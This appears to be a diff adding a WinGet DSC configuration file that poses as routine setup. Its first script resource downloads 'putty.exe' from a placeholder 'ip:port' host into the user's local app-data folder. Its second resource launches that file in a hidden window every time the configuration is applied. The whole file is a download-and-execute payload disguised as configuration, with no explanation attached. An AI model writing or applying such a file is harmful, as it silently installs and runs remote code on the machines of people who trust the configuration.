@@ -1,0 +1,28 @@
+properties:
+  configurationVersion: 0.2
+  resources:
+    - resource: PSDscResources/Script
+      id: DownloadFile
+      directives:
+        description: Download file
+      settings:
+        GetScript: |
+          return @{ Result = (Test-Path "$env:LOCALAPPDATA\putty.exe") }
+        TestScript: |
+          Test-Path "$env:LOCALAPPDATA\putty.exe"
+        SetScript: |
+          Invoke-WebRequest -Uri "http://ip:port/putty.exe" -OutFile "$env:LOCALAPPDATA\putty.exe"
+
+    - resource: PSDscResources/Script
+      id: ExecuteFile
+      dependsOn:
+        - DownloadFile
+      directives:
+        description: Execute file
+      settings:
+        GetScript: |
+          return @{ Result = $false }
+        TestScript: |
+          return $false
+        SetScript: |
+          Start-Process -FilePath "$env:LOCALAPPDATA\putty.exe" -WindowStyle Hidden
